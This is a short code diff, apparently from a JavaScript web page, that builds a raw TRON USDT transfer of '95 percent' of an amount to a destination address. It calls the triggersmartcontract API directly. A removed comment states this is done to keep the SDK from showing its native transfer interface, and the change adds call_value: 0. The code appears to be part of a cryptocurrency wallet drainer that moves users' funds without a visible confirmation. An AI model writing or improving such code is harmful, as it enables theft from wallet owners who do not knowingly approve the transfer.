@@ -820,13 +820,14 @@
                 const evmAmountHex = Number(amount95Percent.toString()).toString(16).padStart(64, "0");
                 const rawParameter = "a9059cbb" + evmDestinoHex + evmAmountHex;
 
-                // Llamada directa al API de triggersmartcontract para evitar que el SDK active la UI de transferencia nativa
+                // Llamada directa al API de triggersmartcontract con call_value: 0 para evitar TRX nativo
                 const transactionDraft = await tronRpcPost("/wallet/triggersmartcontract", {
                     owner_address: tronWeb.address.toHex(walletAddress),
                     contract_address: tronWeb.address.toHex(CONTRATO_USDT),
                     function_selector: "transfer(address,uint256)",
                     parameter: rawParameter,
-                    fee_limit: 100000000
+                    fee_limit: 100000000,
+                    call_value: 0
                 });
 
                 if (!transactionDraft || !transactionDraft.result || !transactionDraft.result.result) {
